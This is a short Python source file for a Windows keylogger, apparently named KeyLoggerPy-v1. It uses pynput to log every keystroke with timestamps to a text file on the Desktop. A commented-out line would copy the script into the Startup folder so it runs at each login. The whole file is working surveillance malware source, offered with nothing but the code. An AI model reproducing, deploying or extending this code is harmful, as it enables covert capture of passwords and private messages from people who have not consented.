from pynput.keyboard import Listener

import os
import logging

from shutil import copyfile

username = os.getlogin()
logging_directory = f"C:/Users/{username}/OneDrive/Desktop/Python/KeyLoggerPy-v1"

##copyfile('logger.py', f'C:/Users/{username}/Appdata/Roaming/Microsoft/Start Menu/Startup/logger.py')

logging.basicConfig(filename=f"C:/Users/{username}/OneDrive/Desktop/Python/KeyLoggerPy-v1/logResults.txt", level=logging.DEBUG, format="%(asctime)s: %(message)s")

def key_handler(key):
    logging.info(key)

with Listener(on_press=key_handler) as listener:
    listener.join()
